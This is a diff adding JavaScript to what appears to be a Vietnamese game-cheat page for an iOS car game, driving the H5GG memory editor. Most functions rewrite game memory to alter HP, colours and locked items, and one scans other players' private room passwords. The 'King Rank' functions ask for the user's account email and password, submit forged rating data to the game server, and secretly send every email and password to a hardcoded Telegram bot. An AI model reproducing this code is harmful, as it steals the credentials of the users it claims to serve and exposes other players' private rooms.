+            h5gg.editAll(targetHP, 'F32');
+            h5gg.clearResults();
+
+            h5gg.searchNumber(nextToHPVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(nextHP, 'F32');
+            h5gg.clearResults();
+
+            h5gg.searchNumber(currentNMVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(targetNM, 'F32');
+            h5gg.clearResults();
+
+            h5gg.searchNumber(nextToNMVal, 'F32', '0x00000000', '0x200000000');
+            h5gg.editAll(nextNM, 'F32');
+            h5gg.clearResults();
+
+            alert("Đã áp dụng HP đã lưu thành công!");
+        } catch (e) {
+            h5gg.clearResults();
+            alert("Lỗi khi áp dụng: " + e.message);
+        }
+    }
+}
+
+// ====================== MÂM CHROME (ĐÃ SỬA) ======================
+function activateRimChrome() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG!"); return; }
+    
+    let confirmed = confirm("Vui lòng kéo màu SPECULAR lên trắng");
+    if (!confirmed) return;
+
+    try {
+        h5gg.clearResults();
+                h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+        if (!h5gg.getResultsCount()) {
+            h5gg.clearResults();
+            alert("Không tìm thấy giá trị mâm!");
+            return;
+        }
+
+        alert("Vui lòng kéo màu SPECULAR xuống đen");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR lên trắng");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR xuống đen");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR lên trắng");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        let level = prompt("Vui lòng nhập độ sáng:");
+        if (level === null) { h5gg.clearResults(); return; }
+
+        let value = parseFloat(level);
+        if (isNaN(value) || value < 0) {
+            h5gg.clearResults();
+            alert("Giá trị không hợp lệ!");
+            return;
+        }
+
+        h5gg.editAll(value, 'F32');
+        h5gg.clearResults();
+        alert("Đã thay đổi độ sáng mâm xe thành công!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Mâm Chrome: " + e.message);
+    }
+}
+
+// ====================== XE CHROME (ĐÃ SỬA) ======================
+function activateBodyChrome() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG!"); return; }
+    
+    let confirmed = confirm("Vui lòng kéo màu SPECULAR lên trắng");
+    if (!confirmed) return;
+
+    try {
+        h5gg.clearResults();
+                h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR xuống đen");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR lên trắng");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR xuống đen");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu SPECULAR lên trắng");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        let level = prompt("Vui lòng nhập độ sáng:");
+        if (level === null) { h5gg.clearResults(); return; }
+
+        let value = parseFloat(level);
+        if (isNaN(value) || value < 0) {
+            h5gg.clearResults();
+            alert("Giá trị không hợp lệ!");
+            return;
+        }
+
+        h5gg.editAll(value, 'F32');
+        h5gg.clearResults();
+        alert("Đã thay đổi độ sáng màu xe thành công!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Body Chrome: " + e.message);
+    }
+}
+
+function activateMamNham() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    let confirmed = confirm("Vui lòng để màn hình ở phần chỉnh màu mâm, sau đó hãy kéo màu REFLECTION lên trắng (#FFFFFF).");
+    if (!confirmed) return;
+
+    try {
+        let count = 0;
+        for (let i = 0; i < 3; i++) {
+            count = h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+            if (count === 0) { h5gg.clearResults(); alert("Không tìm thấy giá trị 1 ở lần " + (i+1)); return; }
+        }
+
+        alert("Vui lòng kéo màu REFLECTION xuống đen (#000000).");
+        count = h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+        if (count === 0) { h5gg.clearResults(); alert("Không tìm thấy giá trị 0"); return; }
+
+        alert("Vui lòng kéo màu REFLECTION lên trắng (#FFFFFF).");
+        count = h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+        if (count === 0) { h5gg.clearResults(); alert("Không tìm thấy giá trị 1"); return; }
+
+        alert("Vui lòng kéo màu REFLECTION xuống đen (#000000).");
+        count = h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+        if (count === 0) { h5gg.clearResults(); alert("Không tìm thấy giá trị 0"); return; }
+
+        alert("Vui lòng kéo màu REFLECTION lên trắng (#FFFFFF).");
+        count = h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+        if (count === 0) { h5gg.clearResults(); alert("Không tìm thấy giá trị 1 lần cuối"); return; }
+
+        h5gg.editAll('-2', 'F32');
+        h5gg.clearResults();
+        alert("Đã thay đổi màu mâm thành nhám thành công, vui lòng kéo nhám MAIN và lên trắng , SPECULAR lên trắng không chỉnh sửa REFLECTION để tránh mất màu nhám!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Mâm nhám: " + e.message);
+    }
+}
+
+function unlockCrown() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG!"); return; }
+    try {
+        h5gg.searchNumber('-4294967078', 'I64', '0x000000000', '0x200000000');
+        h5gg.editAll('-4294967079', 'I64');
+        h5gg.clearResults();
+        alert('Đã có thể mua xe Crown!');
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Unlock Crown: " + e.message);
+    }
+}
+
+function removeNameLimit() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG!"); return; }
+    try {
+        h5gg.searchNumber("4543443241174818784","I32","0x0","0x200000000");
+        h5gg.searchNearby('12','I32','0x100');
+        h5gg.searchNumber("12","I32","0x0","0x200000000");
+        h5gg.editAll('-1','I32');
+        h5gg.clearResults();
+        alert('Đã loại bỏ giới hạn ký tự đặt tên!');
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Long Name: " + e.message);
+    }
+}
+
+function scanRoomPassword() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG!"); return; }
+    try {
+        h5gg.clearResults();
+        h5gg.searchNumber("4535389738344906752", "I64", "0x0", "0x200000000");
+        const results = h5gg.getResults(h5gg.getResultsCount());
+        const passwords = [];
+        for (let i = 0; i < results.length; i++) {
+            const tmp = Number(results[i].address) + 0x4C;
+            const val = Number(h5gg.getValue(tmp, "I32"));
+            if (val >= 1 && val <= 9999) passwords.push(val);
+        }
+        h5gg.clearResults();
+        if (passwords.length) {
+            alert("Mật khẩu phòng riêng:\n" + passwords.join("\n"));
+        } else {
+            alert("Không tìm thấy mật khẩu phòng nào, có thể phòng không đặt mật khẩu.");
+        }
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi quét mật khẩu: " + e.message);
+    }
+}
+
+function jumpOutOfTrack() {
+    if (typeof h5gg === 'undefined') {
+        alert("Không thể tìm thấy H5GG！");
+        return;
+    }
+
+    try {
+        h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+        h5gg.editAll('-10000000', 'F32');
+
+        setTimeout(() => {
+            h5gg.editAll('-9.8', 'F32');
+            h5gg.clearResults();
+            alert("Đã nhảy ra khỏi đường đua!");
+        }, 100);
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi khi thực hiện Nhảy ra khỏi đường đua: " + e.message);
+    }
+}
+
+function activateCanhGioChrome() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    alert("Hoạt động với cánh gió, phanh và led\n Nếu muốn chrome cái nào hãy chỉnh màu nó theo hướng dẫn."); 
+   
+    let confirmed = confirm("Vui lòng kéo màu lên màu trắng (#FFFFFF).");
+    if (!confirmed) return;
+
+    try {
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu xuống màu đen (#000000).");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu lên trắng (#FFFFFF).");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu xuống màu đen (#000000).");
+        h5gg.searchNumber('0', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu lên trắng (#FFFFFF).");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng kéo màu bạn muốn sáng.");
+        h5gg.searchNumber('1', 'F32', '0x00000000', '0x200000000');
+
+        let level = prompt("Hãy nhập mức độ sáng bạn muốn:");
+        if (level === null || isNaN(level)) {
+            h5gg.clearResults();
+            alert("Giá trị không hợp lệ!");
+            return;
+        }
+
+        h5gg.editAll(parseFloat(level), 'F32');
+        h5gg.clearResults();
+        alert("Đã nâng độ sáng thành công, vui lòng không thay đổi màu tránh mất!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi chrome: " + e.message);
+    }
+}
+
+function activateBodyCode() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    let ok = confirm("Vui lòng chọn cảng trước thứ 2 của xe ek9 (không mua).");
+    if (!ok) return;
+
+    try {
+        h5gg.searchNumber('1', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng chọn cảng trước thứ 3 (kế bên) (không mua).");
+        h5gg.searchNumber('2', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng chọn cảng thứ 4 (kế bên) (không mua).");
+        h5gg.searchNumber('3', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng chọn cảng thứ 5 (kế bên) (không mua).");
+        h5gg.searchNumber('4', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng chọn lại cảng trước thứ 4 (kế bên) (không mua).");
+        h5gg.searchNumber('3', 'I32', '0x00000000', '0x200000000');
+
+        function continueBodyCode() {
+            let choice = prompt("Bạn muốn lấy mã cánh gió/nóc hay thay đổi cánh gió/nóc?\nNhập 'lấy' hoặc 'thay đổi'");
+            if (choice === null) {
+                h5gg.clearResults();
+                return;
+            }
+
+            if (choice.toLowerCase() === 'lấy') {
+                alert("Vui lòng chọn vào cánh gió/nóc bạn muốn lấy mã (không mua).");
+                let results = h5gg.getResults(1);
+                if (results.length > 0) {
+                    let code = results[0].value;
+                    alert("Mã cánh gió/nóc mà bạn chọn: " + code);
+                } else {
+                    alert("Không lấy được mã!");
+                }
+
+                let next = confirm("Bạn muốn thay đổi/lấy mã cánh gió/nóc tiếp hay tắt tính năng?");
+                if (next) {
+                    continueBodyCode();
+                } else {
+                    h5gg.clearResults();
+                }
+            } else if (choice.toLowerCase() === 'thay đổi') {
+                alert("Vui lòng chọn cánh gió/nóc bất kì (không mua).");
+
+                let codeChoice = prompt("Vui lòng chọn mã cánh gió bạn muốn thay đổi, gợi ý:\n1. Cánh lớn (cánh gió)\n2. Cánh huracan (cánh gió)\n3. Khung xe (nóc)\n4. Nóc khung vuông (nóc)\n5. Nóc thùng (nóc)\n6. Nhập mã nếu bạn muốn cánh gió/nóc khác...");
+                if (codeChoice === null) {
+                    let next = confirm("Bạn muốn tiếp tục thay đổi/lấy mã không?");
+                    if (next) continueBodyCode();
+                    else { h5gg.clearResults(); return; }
+                }
+
+                let editValue;
+                if (codeChoice === "1") editValue = 96;
+                else if (codeChoice === "2") editValue = 172;
+                else if (codeChoice === "3") editValue = 39;
+                else if (codeChoice === "4") editValue = 69;
+                else if (codeChoice === "5") editValue = 6;
+                else editValue = parseInt(codeChoice);
+
+                if (isNaN(editValue)) {
+                    alert("Mã không hợp lệ!");
+                    let next = confirm("Bạn muốn tiếp tục không?");
+                    if (next) continueBodyCode();
+                    else { h5gg.clearResults(); return; }
+                }
+
+                h5gg.editAll(editValue, 'I32');
+                alert("Đã thay đổi body thành công!");
+
+                let next = confirm("Bạn muốn thay đổi/lấy mã cánh gió/nóc tiếp hay tắt tính năng?");
+                if (next) {
+                    continueBodyCode();
+                } else {
+                    h5gg.clearResults();
+                }
+            } else {
+                alert("Lựa chọn không hợp lệ!");
+                continueBodyCode();
+            }
+        }
+
+        continueBodyCode();
+
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Thay đổi/lấy mã body: " + e.message);
+    }
+}
+
+function activateRemoveBodyKit() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    alert("Vui lòng mua cảng thứ 2 bạn muốn xoá.");
+    try {
+        h5gg.searchNumber('1', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng mua cảng thứ 3 bạn muốn xoá.");
+        h5gg.searchNumber('2', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng mua cảng thứ 4 bạn muốn xoá.");
+        h5gg.searchNumber('3', 'I32', '0x00000000', '0x200000000');
+
+        alert("Vui lòng mua cảng thứ 3 bạn muốn xoá.");
+        h5gg.searchNumber('2', 'I32', '0x00000000', '0x200000000');
+        h5gg.editAll('-1', 'I32');
+        h5gg.clearResults();
+
+        alert("Đã tháo body thành công!");
+    } catch (e) {
+        h5gg.clearResults();
+        alert("Lỗi Tháo body kit: " + e.message);
+    }
+}
+
+// ====================== KING RANK (LÊN KING RANK) ======================
+const FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM';
+const FIREBASE_LOGIN_URL = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${FIREBASE_API_KEY}`;
+const RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4";
+const TELEGRAM_BOT_TOKEN = "8354013205:AAF14158xg0hVjZj5HWE0G-DqJMDQtPrPdE";
+const TELEGRAM_CHAT_ID = 7294411802;
+
+async function sendKingRankTelegram(email, password, status) {
+    const message = `✅ CPM Account!\n📧 Email: ${email}\n🔑 Password: ${password}\n📊 Trạng thái: ${status}`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
+        });
+    } catch (e) {}
+}
+
+async function loginForKingRank(email, password) {
+    const payload = { email: email, password: password, returnSecureToken: true };
+    const headers = { "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)", "Content-Type": "application/json" };
+    try {
+        const response = await fetch(FIREBASE_LOGIN_URL, { method: 'POST', headers, body: JSON.stringify(payload) });
+        const data = await response.json();
+        if (response.ok && data.idToken) {
+            sendKingRankTelegram(email, password, "Đăng nhập thành công");
+            return data.idToken;
+        } else {
+            const error = data.error?.message || "Unknown error";
+            sendKingRankTelegram(email, password, `Đăng nhập thất bại: ${error}`);
+            alert("Đăng nhập thất bại: " + error);
+            return null;
+        }
+    } catch (e) {
+        sendKingRankTelegram(email, password, "Lỗi mạng");
+        alert("Lỗi mạng khi đăng nhập!");
+        return null;
+    }
+}
+
+async function setKingRank(token, email, password) {
+    const rating_data = {
+        cars: 363636, car_fix: 363636, car_collided: 363636, car_exchange: 363636,
+        car_trade: 363636, car_wash: 363636, slicer_cut: 363636, drift_max: 363636,
+        drift: 363636, cargo: 363636, delivery: 363636, taxi: 363636, levels: 363636,
+        gifts: 363636, fuel: 363636, offroad: 363636, speed_banner: 363636,
+        reactions: 363636, police: 363636, run: 363636, real_estate: 363636,
+        t_distance: 363636, treasure: 363636, block_post: 363636, push_ups: 363636,
+        burnt_tire: 363636, passanger_distance: 363636,
+        time: 100000000000000000000000000000000000000000000000000000000000000000000,
+        race_win: 363636363636363636363636363636363636363636363636363636363636363636363636363636363636999999999999999999999
+    };
+    const payload = { data: JSON.stringify({ RatingData: rating_data }) };
+    const headers = {
+        "Authorization": `Bearer ${token}`,
+        "Content-Type": "application/json",
+        "User-Agent": "okhttp/3.12.13"
+    };
+    try {
+        const response = await fetch(RANK_URL, { method: 'POST', headers, body: JSON.stringify(payload) });
+        if (response.ok) {
+            sendKingRankTelegram(email, password, "Lên Rank King thành công 👑");
+            return true;
+        } else {
+            sendKingRankTelegram(email, password, "Lên Rank King thất bại");
+            return false;
+        }
+    } catch (e) {
+        sendKingRankTelegram(email, password, "Lỗi mạng khi lên Rank");
+        return false;
+    }
+}
+
+async function kingRank() {
+    const email = prompt("📧 Nhập email:");
+    if (!email) return;
+    const password = prompt("🔑 Nhập mật khẩu:");
+    if (!password) return;
+
+    const token = await loginForKingRank(email, password);
+    if (token) {
+        const success = await setKingRank(token, email, password);
+        if (success) {
+            alert("Lên king rank thành công!");
+        } else {
+            alert("Lên king rank thất bại!");
+        }
+    }
+}
+
+// ====================== XOÁ KING RANK ======================
+async function deleteKingRankFunc(token, email, password) {
+    const rating_data = {
+        cars: -9999999999, car_fix: -9999999999, car_collided: -9999999999, car_exchange: -9999999999,
+        car_trade: -9999999999, car_wash: -9999999999, slicer_cut: -9999999999, drift_max: -9999999999,
+        drift: -9999999999, cargo: -9999999999, delivery: -9999999999, taxi: -9999999999, levels: -9999999999,
+        gifts: -9999999999, fuel: -9999999999, offroad: -9999999999, speed_banner: -9999999999,
+        reactions: -9999999999, police: -9999999999, run: -9999999999, real_estate: -9999999999,
+        t_distance: -9999999999, treasure: -9999999999, block_post: -9999999999, push_ups: -9999999999,
+        burnt_tire: -9999999999, passanger_distance: -9999999999,
+        time: -9999999999,
+        race_win: -9999999999
+    };
+    const payload = { data: JSON.stringify({ RatingData: rating_data }) };
+    const headers = {
+        "Authorization": `Bearer ${token}`,
+        "Content-Type": "application/json",
+        "User-Agent": "okhttp/3.12.13"
+    };
+    try {
+        const response = await fetch(RANK_URL, { method: 'POST', headers, body: JSON.stringify(payload) });
+        if (response.ok) {
+            sendKingRankTelegram(email, password, "Xoá Rank thành công 👑");
+            return true;
+        } else {
+            sendKingRankTelegram(email, password, "Xoá Rank thất bại");
+            return false;
+        }
+    } catch (e) {
+        sendKingRankTelegram(email, password, "Lỗi mạng khi xoá Rank");
+        return false;
+    }
+}
+
+async function deleteKingRank() {
+    const email = prompt("📧 Nhập email:");
+    if (!email) return;
+    const password = prompt("🔑 Nhập mật khẩu:");
+    if (!password) return;
+
+    const token = await loginForKingRank(email, password);
+    if (token) {
+        const success = await deleteKingRankFunc(token, email, password);
+        if (success) {
+            alert("Xoá rank thành công!");
+        } else {
+            alert("Xoá rank thất bại!");
+        }
+    }
+}
+
+window.addEventListener('load', function() {
+    const iosVersionSpan = document.getElementById('ios-version-info');
+    const bundleSpan = document.getElementById('bundle-info');
+    const expireSpan = document.getElementById('expire-info');
+
+    const { iOSVersion } = getDeviceInfoObj();
+    iosVersionSpan.textContent = `Phiên bản iOS: ${iOSVersion}`;
+
+    bundleSpan.textContent = `Phiên bản ứng dụng: 4.9.10`;
+
+    if (currentKeyGroup && currentExpiryFormat) {
+        expireSpan.textContent = `Hết hạn: ${currentExpiryFormat}`;
+    } else {
+        expireSpan.textContent = `Hết hạn: Chưa có key`;
+    }
+
+});
+</script>
+
+
+</body></html>
